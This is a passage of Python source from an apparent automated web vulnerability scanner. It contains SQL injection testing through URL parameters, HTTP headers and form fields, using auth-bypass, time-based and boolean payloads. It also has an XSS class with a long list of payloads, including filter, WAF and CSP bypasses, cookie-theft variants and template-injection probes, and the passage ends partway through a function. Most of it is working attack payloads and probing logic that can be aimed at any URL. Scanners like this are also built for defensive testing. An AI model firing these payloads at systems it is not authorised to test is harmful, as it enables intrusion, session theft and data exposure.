            "supplied argument is not a valid mysql",
            "mysql_fetch",
            "mysql_num_rows",
            "mysql_result",
            "mysqli_",
            "com.mysql.jdbc",
            # PostgreSQL
            r"postgresql.*?error",
            r"warning.*?\Wpg_",
            "valid postgresql result",
            r"npgsql\.",
            "pg_query",
            "pg_exec",
            # MSSQL
            r"driver.{1,20}sql[-_]?server",
            "odbc sql server driver",
            "microsoft ole db provider for sql server",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            r"sqlserver.*?error",
            # SQLite
            "sqlite/jdcconnection",
            "sqlite.exception",
            "system.data.sqlite.sqliteexception",
            r"warning.*?sqlite_",
            r"warning.*?sqlite3::",
            # Oracle
            r"pdo::__construct",
            r"ora-[0-9]{5}",
            "oracle error",
            r"warning.*?\Woci_",
            # DB2
            "db2 sql error",
            # Generic
            r"sqlstate\[",
            r"syntax error.*?at line",
            "division by zero",
            "invalid column name",
            "invalid object name",
            "unknown column",
            "column count doesn",
            "the used select statements have different number",
            "database error",
            "sql error",
            "sql command not properly ended",
            r"warning.*?failed.*?query",
            r"error.*?query.*?failed",
            "fatal error.*?query",
            "access denied for user",
            r"table.*?doesn.t exist",
            r"unknown table",
            r"no such column",
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        """Scan URL for SQL injection vulnerabilities"""
        vulnerabilities = []

        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            # Always test URL params if present
            for param_name in list(params.keys())[:self.config.max_params_test]:
                if vulnerabilities:
                    break
                param_vulns = await self._test_parameter(client, url, param_name, params)
                vulnerabilities.extend(param_vulns)

            # Always scan forms too (not either/or)
            if not vulnerabilities:
                forms_vulns = await self._scan_forms(client, url)
                vulnerabilities.extend(forms_vulns)

            # ── Header injection: SQLi via HTTP headers ───────────────────
            if not vulnerabilities:
                header_vulns = await self._test_headers(client, url)
                vulnerabilities.extend(header_vulns)

        except Exception:
            pass

        return vulnerabilities

    async def _test_headers(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        """Test injectable HTTP headers for SQLi"""
        vulnerabilities = []
        _injectable_headers = [
            "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
            "X-Remote-IP", "X-Client-IP", "Referer", "User-Agent",
            "X-Custom-IP-Authorization", "CF-Connecting-IP",
        ]
        _header_payloads = [
            PayloadItem("'", "Error-based", "Single quote — triggers SQL error in header injection"),
            PayloadItem("' OR '1'='1", "Auth Bypass", "Auth bypass via header injection"),
            PayloadItem("' OR SLEEP(5)--", "Time-based", "Time-based header injection — MySQL"),
            PayloadItem("' AND 1=1--", "Boolean True", "Boolean blind via header"),
            PayloadItem("' AND 1=2--", "Boolean False", "Boolean blind via header — false branch"),
        ]
        try:
            _t0 = time.monotonic()
            baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                        follow_redirects=self.config.follow_redirects)
            baseline_time = time.monotonic() - _t0
            baseline_content = baseline.text.lower()

            for header_name in _injectable_headers:
                if vulnerabilities:
                    break
                for item in _header_payloads:
                    try:
                        hdrs = random_headers()
                        hdrs[header_name] = item.payload
                        _is_time = "SLEEP" in item.payload.upper()

                        _req_t0 = time.monotonic()
                        resp = await client.get(url, headers=hdrs,
                                                timeout=self.config.vuln_timeout,
                                                follow_redirects=self.config.follow_redirects)
                        elapsed = time.monotonic() - _req_t0

                        content = resp.text.lower()
                        matched_errors = [
                            p for p in self.sql_errors
                            if re.search(p, content, re.IGNORECASE)
                            and not re.search(p, baseline_content, re.IGNORECASE)
                        ]
                        if len(matched_errors) >= 1:
                            vulnerabilities.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SQLI,
                                severity="HIGH",
                                vulnerable_params=[f"Header: {header_name}"],
                                payload_used=item.payload,
                                evidence=f"SQL error via header '{header_name}': {matched_errors[:2]}",
                                details=f"Header '{header_name}' is interpolated into SQL query without sanitization",
                                subtype="Header Injection - " + item.subtype,
                                impact=item.impact,
                            ))
                            return vulnerabilities

                        if _is_time:
                            if elapsed >= 4.0 and elapsed > baseline_time * 2.5:
                                try:
                                    _p0 = time.monotonic()
                                    await client.get(url, timeout=self.config.vuln_timeout,
                                                     follow_redirects=self.config.follow_redirects)
                                    probe = time.monotonic() - _p0
                                    if probe < elapsed * 0.5:
                                        vulnerabilities.append(VulnerabilityResult(
                                            url=url,
                                            vulnerability_type=VulnerabilityType.SQLI,
                                            severity="HIGH",
                                            vulnerable_params=[f"Header: {header_name}"],
                                            payload_used=item.payload,
                                            evidence=f"Delay {elapsed:.2f}s via header '{header_name}' vs probe {probe:.2f}s",
                                            details=f"Time-based SQLi via HTTP header '{header_name}'",
                                            subtype="Header Injection - Time-based",
                                            impact=item.impact,
                                        ))
                                        return vulnerabilities
                                except Exception:
                                    pass

                    except Exception:
                        continue
        except Exception:
            pass
        return vulnerabilities

    async def _test_parameter(
        self,
        client: httpx.AsyncClient,
        url: str,
        param_name: str,
        all_params: Dict
    ) -> List[VulnerabilityResult]:
        """Test a specific parameter for SQLi"""
        vulnerabilities = []

        try:
            _t0 = time.monotonic()
            baseline_response = await client.get(
                url,
                timeout=self.config.vuln_timeout,
                follow_redirects=self.config.follow_redirects
            )
            baseline_time = time.monotonic() - _t0
            baseline_content = baseline_response.text.lower()
            baseline_length = len(baseline_response.text)

            original_val = all_params[param_name][0] if all_params[param_name] else ""
            parsed = urllib.parse.urlparse(url)

            for item in self.sqli_payloads:
                payload = item.payload
                _is_time = any(k in payload.upper() for k in ["SLEEP(", "WAITFOR", "BENCHMARK("]) \
                           or "pg_sleep" in payload

                # Test payload alone AND appended to original value (critical for numeric params like id=2)
                candidates = [payload]
                if original_val:
                    candidates.append(original_val + payload)

                found = False
                for injected in candidates:
                    if found:
                        break
                    try:
                        test_params = all_params.copy()
                        test_params[param_name] = [injected]
                        test_query = urllib.parse.urlencode(test_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            test_query,
                            parsed.fragment
                        ))

                        _req_t0 = time.monotonic()
                        response = await client.get(
                            test_url,
                            timeout=self.config.vuln_timeout,
                            follow_redirects=self.config.follow_redirects
                        )
                        elapsed = time.monotonic() - _req_t0

                        response_content = response.text.lower()
                        response_length = len(response.text)

                        # ── 0. Size anomaly: single quote causes big diff → likely error page ──
                        # FP guard: only fire if ALSO an HTTP error code or known error keyword
                        if payload in ("'", '"') or (original_val and injected == original_val + "'"):
                            size_diff = abs(response_length - baseline_length)
                            max_sz = max(response_length, baseline_length, 1)
                            _generic_error = re.search(
                                r'\berror\b|\bwarning\b|\bexception\b|\bsyntax\b',
                                response_content, re.IGNORECASE
                            )
                            if size_diff > 100 and (size_diff / max_sz) > 0.20 and _generic_error:
                                vuln = VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.SQLI,
                                    severity="MEDIUM",
                                    vulnerable_params=[param_name],
                                    payload_used=injected,
                                    evidence=(
                                        f"Single-quote caused {size_diff}B size change "
                                        f"({size_diff/max_sz:.0%}) + error keyword — likely SQL error page"
                                    ),
                                    details="Probable SQL injection — manual verification recommended",
                                    subtype="Error-based (size anomaly)",
                                    impact=item.impact,
                                )
                                vulnerabilities.append(vuln)
                                return vulnerabilities

                        # ── 1. Error-based: must NOT appear in baseline ─────────────
                        # FP guard: require 2 different patterns OR 1 pattern + status change
                        matched_errors = [
                            p for p in self.sql_errors
                            if re.search(p, response_content, re.IGNORECASE)
                            and not re.search(p, baseline_content, re.IGNORECASE)
                        ]
                        if len(matched_errors) >= 2 or (
                            len(matched_errors) == 1
                            and response.status_code != baseline_response.status_code
                        ):
                            vuln = VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SQLI,
                                severity="HIGH",
                                vulnerable_params=[param_name],
                                payload_used=injected,
                                evidence=f"SQL errors triggered: {matched_errors[:2]} — absent from baseline",
                                details="Error-based SQL injection confirmed",
                                subtype=item.subtype,
                                impact=item.impact,
                            )
                            vulnerabilities.append(vuln)
                            return vulnerabilities

                        # ── 2. Time-based: measure actual elapsed time ──────────────
                        if _is_time:
                            _m = re.search(r'(?:SLEEP|pg_sleep)\((\d+)\)', payload, re.IGNORECASE)
                            expected_delay = int(_m.group(1)) if _m else 5
                            if (elapsed >= expected_delay * 0.8
                                    and elapsed > baseline_time * 2.5
                                    and elapsed >= 2.5):
                                # FP guard: re-run to confirm server isn't just slow
                                try:
                                    _v_t0 = time.monotonic()
                                    await client.get(url, timeout=self.config.vuln_timeout,
                                                     follow_redirects=self.config.follow_redirects)
                                    probe = time.monotonic() - _v_t0
                                    # Fast probe confirms the delay was from the payload
                                    if probe < elapsed * 0.5:
                                        vuln = VulnerabilityResult(
                                            url=url,
                                            vulnerability_type=VulnerabilityType.SQLI,
                                            severity="HIGH",
                                            vulnerable_params=[param_name],
                                            payload_used=injected,
                                            evidence=(
                                                f"Delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s "
                                                f"vs fast probe {probe:.2f}s (expected ≥{expected_delay}s)"
                                            ),
                                            details="Time-based blind SQL injection confirmed",
                                            subtype=item.subtype,
                                            impact=item.impact,
                                        )
                                        vulnerabilities.append(vuln)
                                        return vulnerabilities
                                except Exception:
                                    pass

                        # ── 3. Boolean-based: strict true≠false + baseline anchor ───
                        if "1=1" in payload or "'1'='1" in payload:
                            false_payload = payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2")
                            false_injected = injected.replace("1=1", "1=2").replace("'1'='1", "'1'='2")
                            test_params_false = all_params.copy()
                            test_params_false[param_name] = [false_injected]
                            test_query_false = urllib.parse.urlencode(test_params_false, doseq=True)
                            test_url_false = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, test_query_false, parsed.fragment
                            ))
                            response_false = await client.get(
                                test_url_false,
                                timeout=self.config.vuln_timeout,
                                follow_redirects=self.config.follow_redirects
                            )
                            len_true  = response_length
                            len_false = len(response_false.text)
                            diff_tf   = abs(len_true - len_false)
                            max_len   = max(len_true, len_false, 1)

                            # FP guard: stricter threshold + baseline must clearly match one branch
                            # Also require: false payload returns different HTTP status OR
                            # baseline aligns more than 60% with true branch
                            if diff_tf > 150 and (diff_tf / max_len) > 0.05:
                                dist_to_true  = abs(baseline_length - len_true)
                                dist_to_false = abs(baseline_length - len_false)
                                # Baseline should be much closer to one branch (within 10% of that branch)
                                closer_branch = min(dist_to_true, dist_to_false)
                                if (abs(dist_to_true - dist_to_false) > diff_tf * 0.4
                                        and closer_branch < diff_tf * 0.3):
                                    vuln = VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.SQLI,
                                        severity="HIGH",
                                        vulnerable_params=[param_name],
                                        payload_used=injected,
                                        evidence=(
                                            f"TRUE={len_true}B  FALSE={len_false}B  "
                                            f"Baseline={baseline_length}B  Δ={diff_tf}B ({diff_tf/max_len:.0%})"
                                        ),
                                        details="Boolean-based blind SQL injection confirmed",
                                        subtype=item.subtype,
                                        impact=item.impact,
                                    )
                                    vulnerabilities.append(vuln)
                                    return vulnerabilities

                    except asyncio.TimeoutError:
                        elapsed = time.monotonic() - _req_t0
                        if _is_time:
                            # FP guard: probe confirms server isn't just slow
                            try:
                                _p0 = time.monotonic()
                                await client.get(url, timeout=self.config.vuln_timeout,
                                                 follow_redirects=self.config.follow_redirects)
                                probe = time.monotonic() - _p0
                                if probe < elapsed * 0.5:
                                    vuln = VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.SQLI,
                                        severity="HIGH",
                                        vulnerable_params=[param_name],
                                        payload_used=injected,
                                        evidence=f"Timeout {self.config.vuln_timeout}s vs probe {probe:.2f}s — time-based delay confirmed",
                                        details="Time-based blind SQL injection (timeout-confirmed)",
                                        subtype=item.subtype,
                                        impact=item.impact,
                                    )
                                    vulnerabilities.append(vuln)
                                    return vulnerabilities
                            except Exception:
                                pass
                    except Exception:
                        continue

        except Exception:
            pass

        return vulnerabilities

    async def _scan_forms(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []

        try:
            response = await client.get(url, timeout=self.config.vuln_timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms[:5]:
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                form_data = {}

                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    if input_name and input_type not in ['submit', 'button']:
                        form_data[input_name] = 'test'

                if not form_data:
                    continue

                for field_name in list(form_data.keys())[:3]:
                    form_action = action if action.startswith('http') else urllib.parse.urljoin(url, action)

                    # ── Fetch baseline for this form/field before payload testing ──
                    try:
                        if method == 'post':
                            _bl = await client.post(form_action, data=form_data,
                                                    timeout=self.config.vuln_timeout,
                                                    follow_redirects=self.config.follow_redirects)
                        else:
                            _bl = await client.get(form_action, params=form_data,
                                                   timeout=self.config.vuln_timeout,
                                                   follow_redirects=self.config.follow_redirects)
                        baseline_form_text = _bl.text.lower()
                    except Exception:
                        continue  # skip field if baseline fails

                    found = False
                    for item in self.sqli_payloads:
                        if found:
                            break
                        payload = item.payload
                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        try:
                            if method == 'post':
                                test_response = await client.post(
                                    form_action, data=test_data,
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects)
                            else:
                                test_response = await client.get(
                                    form_action, params=test_data,
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects)

                            response_content = test_response.text.lower()
                            for error_pattern in self.sql_errors:
                                if re.search(error_pattern, response_content, re.IGNORECASE):
                                    # Must NOT appear in baseline
                                    if not re.search(error_pattern, baseline_form_text, re.IGNORECASE):
                                        vuln = VulnerabilityResult(
                                            url=form_action,
                                            vulnerability_type=VulnerabilityType.SQLI,
                                            severity="HIGH",
                                            vulnerable_params=[field_name],
                                            payload_used=payload,
                                            evidence="SQL error triggered in form — absent from baseline",
                                            details=f"Form field '{field_name}' vulnerable to SQL injection",
                                            subtype=item.subtype,
                                            impact=item.impact,
                                        )
                                        vulnerabilities.append(vuln)
                                        found = True
                                        break

                        except Exception:
                            continue

        except Exception:
            pass

        return vulnerabilities

class XSSScanner:

    def __init__(self, config: Config):
        self.config = config

        self.xss_payloads = [
            # ── Script injection ──────────────────────────────────────────────
            PayloadItem("<script>alert(1)</script>", "Script Tag", "Basic script injection — confirms XSS"),
            PayloadItem("<script>alert('XSS')</script>", "Script Tag", "Script injection with string"),
            PayloadItem("<script>alert(document.cookie)</script>", "Script - Cookie Theft", "Steals session cookies"),
            PayloadItem("<script>confirm(1)</script>", "Script - confirm", "Bypasses filters that block 'alert'"),
            PayloadItem("<script>prompt(1)</script>", "Script - prompt", "Alternate JS execution bypass"),
            PayloadItem("<ScRiPt>alert(1)</ScRiPt>", "Case Bypass", "Bypasses case-sensitive filters"),
            PayloadItem("</script><script>alert(1)</script>", "Context Escape", "Escapes existing script block"),
            PayloadItem("<script>alert(String.fromCharCode(88,83,83))</script>", "Char Code", "Bypasses string-based filters"),
            # ── Attribute escape → tag injection ─────────────────────────────
            PayloadItem("'><script>alert(1)</script>", "Single-Quote Escape", "Escapes single-quoted attribute"),
            PayloadItem('"><script>alert(1)</script>', "Double-Quote Escape", "Escapes double-quoted attribute"),
            PayloadItem("'><img src=x onerror=alert(1)>", "Attr Escape - img", "Attribute escape + event handler"),
            PayloadItem('"><img src=x onerror=alert(1)>', "Attr Escape - img DQ", "Attribute escape + event handler (DQ)"),
            PayloadItem("' autofocus onfocus=alert(1) '", "Attr Injection - onfocus", "Injects into attribute context — autofocus triggers immediately"),
            PayloadItem('" autofocus onfocus=alert(1) "', "Attr Injection DQ", "Attribute injection with double quotes"),
            PayloadItem("' onmouseover=alert(1) x='", "Attr Injection - hover", "Injects event handler into existing attribute"),
            # ── img / event handlers ─────────────────────────────────────────
            PayloadItem("<img src=x onerror=alert(1)>", "img onerror", "Executes on broken image"),
            PayloadItem("<img src onerror=alert(1)>", "img onerror no-src", "No src value — triggers onerror immediately"),
            PayloadItem("<img src=x onerror=alert(document.cookie)>", "img - Cookie Theft", "Cookie theft via onerror"),
            PayloadItem("<img src='x' onerror='alert(1)'>", "img onerror SQ", "img onerror with single quotes"),
            PayloadItem('<img src="x" onerror="alert(1)">', "img onerror DQ", "img onerror with double quotes"),
            PayloadItem("<img/src=x onerror=alert(1)>", "img slash bypass", "Bypasses whitespace filters"),
            # ── SVG ───────────────────────────────────────────────────────────
            PayloadItem("<svg onload=alert(1)>", "SVG onload", "SVG auto-executes on load"),
            PayloadItem("<svg/onload=alert(1)>", "SVG slash", "SVG without space — filter bypass"),
            PayloadItem("<svg onload=alert(1)//", "SVG comment", "SVG with trailing comment"),
            PayloadItem("<svg><script>alert(1)</script></svg>", "SVG script", "Script in SVG namespace"),
            PayloadItem("<svg><animate onbegin=alert(1) attributeName=x>", "SVG animate", "Executes via animate element"),
            # ── HTML5 event handlers ─────────────────────────────────────────
            PayloadItem("<body onload=alert(1)>", "body onload", "Executes on page load"),
            PayloadItem("<input autofocus onfocus=alert(1)>", "input autofocus", "Auto-executes without interaction"),
            PayloadItem("<details open ontoggle=alert(1)>", "details ontoggle", "Executes via HTML5 details element"),
            PayloadItem("<video><source onerror=alert(1)>", "video onerror", "Executes via video source error"),
            PayloadItem("<audio src=x onerror=alert(1)>", "audio onerror", "Executes via audio error"),
            PayloadItem("<marquee onstart=alert(1)>", "marquee onstart", "Executes via deprecated marquee element"),
            PayloadItem("<div onmouseover=alert(1)>x</div>", "div hover", "Executes on mouse hover"),
            # ── Polyglot / context-blind ──────────────────────────────────────
            PayloadItem("</title><script>alert(1)</script>", "title escape", "Escapes title tag context"),
            PayloadItem("</textarea><script>alert(1)</script>", "textarea escape", "Escapes textarea context"),
            PayloadItem("<<script>alert(1)//<</script>", "Nested Tag", "Bypasses single-strip filters"),
            # ── JS URI ────────────────────────────────────────────────────────
            PayloadItem("javascript:alert(1)", "JS URI", "Executes via javascript: URI"),
            PayloadItem("javascript:alert(document.cookie)", "JS URI Cookie", "Cookie theft via URI"),
            PayloadItem("JaVaScRiPt:alert(1)", "JS URI Case Bypass", "Case bypass for javascript: URI"),
            # ── Encoding bypasses ─────────────────────────────────────────────
            PayloadItem("%3Cscript%3Ealert(1)%3C/script%3E", "URL Encoded", "URL-encoded script tag"),
            PayloadItem("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML Entities", "HTML entity encoded"),
            # ── Iframe / Object ───────────────────────────────────────────────
            PayloadItem("<iframe src='javascript:alert(1)'>", "iframe JS URI", "iframe with JS URI"),
            PayloadItem("<object data='javascript:alert(1)'>", "object JS URI", "object tag JS URI"),
            # ── Template injection ────────────────────────────────────────────
            PayloadItem("{{7*7}}", "Template - SSTI probe", "Detects template injection (result: 49)"),
            PayloadItem("${7*7}", "Template - JS literal", "Detects JS template literal injection"),
            PayloadItem("{{constructor.constructor('alert(1)')()}}", "Angular SSTI", "Angular template RCE"),

            # ── DOM XSS / sink injection ──────────────────────────────────────
            PayloadItem("<script>document.write('<img src=x onerror=alert(1)>')</script>", "DOM Write", "DOM XSS via document.write"),
            PayloadItem("<script>location='javascript:alert(1)'</script>",  "DOM Location", "DOM XSS via location redirect"),
            PayloadItem("<script>eval('alert(1)')</script>",                "DOM Eval",     "eval() injection"),

            # ── Attribute injection (no tag needed) ───────────────────────────
            PayloadItem("x onmouseover=alert(1)",          "Attr Inject raw",      "Injects event into existing tag without quotes"),
            PayloadItem("x><script>alert(1)</script>",     "Tag break",            "Breaks existing attribute then injects tag"),
            PayloadItem("' onpointerover=alert(1) x='",    "PointerOver SQ",       "Pointer event — harder to WAF than mouse events"),
            PayloadItem('" onpointerover=alert(1) x="',    "PointerOver DQ",       "Pointer event double-quote variant"),
            PayloadItem("' onauxclick=alert(1) x='",       "AuxClick event",       "Middle-click event handler"),
            PayloadItem("' onanimationend=alert(1) x='",   "Animation event",      "CSS animation end trigger"),

            # ── Newer HTML5 elements / handlers ──────────────────────────────
            PayloadItem("<meter onmouseover=alert(1)>0</meter>",  "meter hover",    "HTML5 meter element event"),
            PayloadItem("<time onmouseover=alert(1)>0</time>",    "time hover",     "HTML5 time element event"),
            PayloadItem("<a href=javascript:alert(1)>x</a>",      "anchor jsURI",   "anchor href with JS URI"),
            PayloadItem("<base href=javascript:/x/><a href=1>click</a>", "base href","base tag href abuse"),
            PayloadItem("<form><button formaction=javascript:alert(1)>X</button></form>", "formaction", "formaction JS URI"),
            PayloadItem("<isindex type=image src=x onerror=alert(1)>",  "isindex",  "Old HTML isindex element"),
            PayloadItem("<link rel=stylesheet href=javascript:alert(1)>","link href","CSS link with JS URI"),

            # ── Filter bypass / obfuscation ───────────────────────────────────
            PayloadItem("<img src=x onerror=&#97;lert(1)>",       "Entity Bypass",   "HTML entity in event value"),
            PayloadItem("<svg><script>&#97;lert(1)</script></svg>","Entity in SVG",   "HTML entity inside SVG script"),
            PayloadItem("<script>\\u0061lert(1)</script>",         "Unicode Escape",  "Unicode escape in script"),
            PayloadItem("<img src=x onerror=window['al'+'ert'](1)>","String concat",  "String concatenation to bypass keyword filter"),
            PayloadItem("<script>setTimeout('alert(1)',0)</script>","setTimeout",      "setTimeout bypass"),
            PayloadItem("<script>setInterval('alert(1)',9999)</script>","setInterval", "setInterval bypass"),
            PayloadItem("<svg><a><animate attributeName=href values=javascript:alert(1) /><text>click</text></a></svg>",
                        "SVG animate href", "SVG animate changes href to JS URI"),
        
            # ── Advanced XSS ─────────────────────────────────────────────────
            PayloadItem('" onmouseover="alert(1)',             "Attr event",    "Attribute context breakout"),
            PayloadItem("' onfocus='alert(1)' autofocus='",   "Autofocus",     "No user interaction needed"),
            PayloadItem("javascript:alert(1)",                 "href JS URI",   "Direct href injection"),
            PayloadItem("#<img src=x onerror=alert(1)>",       "Hash DOM XSS",  "Fragment DOM sink"),
            PayloadItem("<marquee onstart=alert(1)>x</marquee>","marquee",      "Auto-fires"),
            PayloadItem("<details open ontoggle=alert(1)>x</details>","ontoggle","Auto-toggle"),
            PayloadItem('<math><mtext></table></math><img src=x onerror=alert(1)>',"MathML","NS escape"),
            PayloadItem('<svg><animate onbegin=alert(1) attributeName=x dur=1s>',"SVG onbegin","Fires on start"),
            PayloadItem("<ScRiPt>alert(1)</sCrIpT>",           "Mixed case",    "WAF bypass"),
            PayloadItem("<script>eval(atob('YWxlcnQoMSk='))</script>","Base64 eval","atob obfuscation"),
            PayloadItem('--><svg/onload=alert(1)><!--',        "Polyglot",      "Comment escape"),
            PayloadItem('<img src=x onerror="alert(String.fromCharCode(88,83,83))">',"Charcode","Charcode obfus"),
            PayloadItem('<iframe src="javascript:alert(1)"></iframe>',"iframe JS","JS URI in iframe"),
            PayloadItem('<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)></div>',"CSS anim","CSS animation event"),
            PayloadItem('<body onload=alert(1)>',               "onload body",   "Body onload"),
            PayloadItem('<input type=image src=x onerror=alert(1)>',"input img", "Image input error"),
            PayloadItem('<video autoplay onplay=alert(1)><source src=x></video>',"video autoplay","Autoplay fires"),
            PayloadItem('<svg><script>alert&#40;1&#41;</script></svg>',"HTML entity","Entity-encoded parens"),
            # ── CSP / Nonce bypass attempts ───────────────────────────────────
            PayloadItem('<script nonce="">alert(1)</script>',           "Nonce Empty",     "Empty nonce — some parsers accept it"),
            PayloadItem('<script src=data:,alert(1)>',                  "Script data URI", "data: URI as script src"),
            PayloadItem('<iframe srcdoc="<script>alert(1)</script>">',  "srcdoc XSS",      "HTML inside srcdoc attribute"),
            PayloadItem('<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">', "srcdoc encoded", "Entity-encoded srcdoc"),
            # ── Expression injection ──────────────────────────────────────────
            PayloadItem('<div style="width:expression(alert(1))">',     "CSS Expression",  "IE-only CSS expression XSS"),
            # ── Protocol handlers ─────────────────────────────────────────────
            PayloadItem('<a href="vbscript:alert(1)">click</a>',        "VBScript URI",    "VBScript URI — older IE"),
            PayloadItem('<a href="data:text/html,<script>alert(1)</script>">x</a>', "data HTML", "data: URI with inline HTML"),
            # ── Recursive / polyglot ─────────────────────────────────────────
            PayloadItem("'\"--></style></script><script>alert(1)</script>", "Polyglot all", "Closes all common contexts before injecting"),
            PayloadItem("</script><!--<script-->alert(1)//",            "Comment break",   "Breaks out of script via comment"),
            PayloadItem('<img src="1" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                        "Full entity encode", "Fully entity-encoded alert(1) in event handler"),
            # ── WAF bypass: eval alternatives ────────────────────────────────
            PayloadItem("<script>top['al'+'ert'](1)</script>",          "Bracket notation","Dot-free property access"),
            PayloadItem("<script>(alert)(1)</script>",                   "Grouped call",    "Grouped function call — evades simple regex"),
            PayloadItem("<script>window.onerror=alert;throw 1</script>","onerror throw",   "Calls alert via onerror + throw"),
            PayloadItem("<script>Function('alert(1)')()</script>",       "Function ctor",   "Function constructor as eval alternative"),
            PayloadItem("<script>[].filter.call([1],alert)</script>",    "Array.filter",    "Calls alert via Array.filter.call"),
        ]

        self.xss_patterns = [
            # Script tags
            r"<script[^>]*>.*?alert",
            r"<script[^>]*>.*?confirm",
            r"<script[^>]*>.*?prompt",
            r"<script[^>]*>",
            # Event handlers on any tag
            r"<[a-z][^>]*\s+on\w+\s*=\s*['\"]?alert",
            r"<[a-z][^>]*\s+on\w+\s*=\s*['\"]?confirm",
            r"<[a-z][^>]*\s+on\w+\s*=\s*['\"]?prompt",
            r"onerror\s*=\s*['\"]?\s*alert",
            r"onload\s*=\s*['\"]?\s*alert",
            r"onfocus\s*=\s*['\"]?\s*alert",
            r"ontoggle\s*=\s*['\"]?\s*alert",
            r"onmouseover\s*=\s*['\"]?\s*alert",
            r"onstart\s*=\s*['\"]?\s*alert",
            r"onbegin\s*=\s*['\"]?\s*alert",
            # Specific tags
            r"<img[^>]*onerror[^>]*>",
            r"<svg[^>]*(onload|onbegin)[^>]*>",
            r"<body[^>]*onload[^>]*>",
            r"<input[^>]*onfocus[^>]*>",
            r"<details[^>]*ontoggle[^>]*>",
            r"<iframe[^>]*src\s*=\s*['\"]?javascript:",
            r"<object[^>]*data\s*=\s*['\"]?javascript:",
            r"<marquee[^>]*onstart[^>]*>",
            # JS URI
            r"javascript\s*:\s*alert",
            r"javascript\s*:\s*confirm",
            # data URI
            r"data:text/html.*script",
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []

        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            # Always test URL params if present
            for param_name in list(params.keys())[:self.config.max_params_test]:
                if vulnerabilities:
                    break
                param_vulns = await self._test_parameter(client, url, param_name, params)
                vulnerabilities.extend(param_vulns)

            # Always scan forms too (not either/or)
            if not vulnerabilities:
                forms_vulns = await self._scan_forms(client, url)
                vulnerabilities.extend(forms_vulns)

        except Exception:
            pass

        return vulnerabilities

    async def _test_parameter(
        self, 
        client: httpx.AsyncClient, 
        url: str, 
        param_name: str,
        all_params: Dict
    ) -> List[VulnerabilityResult]:
        vulnerabilities = []

        try:
            for item in self.xss_payloads:
                payload = item.payload
                try:
                    test_params = all_params.copy()
                    test_params[param_name] = [payload]

                    parsed = urllib.parse.urlparse(url)
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        test_query,
                        parsed.fragment
                    ))

                    response = await client.get(
                        test_url,
                        timeout=self.config.vuln_timeout,
                        follow_redirects=self.config.follow_redirects
                    )

                    response_content = response.text

                    # ── Reflected XSS detection ─────────────────────────────────
                    # Strategy: if the raw payload appears unencoded in the response
                    # AND the payload itself contains executable markup → XSS confirmed.
                    # This mirrors how scanners like XSStrike and Dalfox work.

                    # ── SSTI detection: check for evaluated result, not raw reflection ──
                    _ssti_probes = {
                        "{{7*7}}":    "49",       # Jinja2 / Twig / generic
                        "{{7*'7'}}":  "7777777",  # Jinja2-specific (string * int)
                        "<%= 7*7 %>": "49",        # ERB (Ruby) / EJS (Node)
                        "#{7*7}":     "49",        # Ruby ERB alternate
                        "${7*7}":     "49",        # FreeMarker / Thymeleaf / Spring
                        "{{constructor.constructor('alert(1)')()}}": None,  # Angular — detect by absence
                    }
                    if payload in _ssti_probes:
                        expected = _ssti_probes[payload]
                        if expected is not None:
                            # Numeric eval check: input gone + result present → SSTI confirmed
                            if expected in response_content and payload not in response_content:
                                vulnerabilities.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.XSS,
                                    severity="CRITICAL",
                                    vulnerable_params=[param_name],
                                    payload_used=payload,
                                    evidence=f"SSTI — '{payload}' evaluated to '{expected}' (input absent from response)",
                                    details=f"Server-Side Template Injection in '{param_name}' — may lead to RCE",
                                    subtype="SSTI - Server-Side Template Injection",
                                    impact="Template engine executes attacker input — can escalate to full RCE",
                                ))
                                return vulnerabilities
                        else:
                            # Angular SSTI: payload consumed by engine + substantial size diff
                            # Guards:
                            #   1. Must be 200 OK (WAF blocks, 4xx errors also consume payload)
                            #   2. Size diff > 500B (eliminates minor layout differences)
                            #   3. Confirm with a second clean baseline to rule out server variance
                            if payload not in response_content and response.status_code == 200:
                                try:
                                    _bl1 = await client.get(url, timeout=self.config.vuln_timeout,
                                                            follow_redirects=self.config.follow_redirects)
                                    _bl2 = await client.get(url, timeout=self.config.vuln_timeout,
                                                            follow_redirects=self.config.follow_redirects)
                                    # Use the larger of the two baselines to be conservative
                                    _bl_len = max(len(_bl1.text), len(_bl2.text))
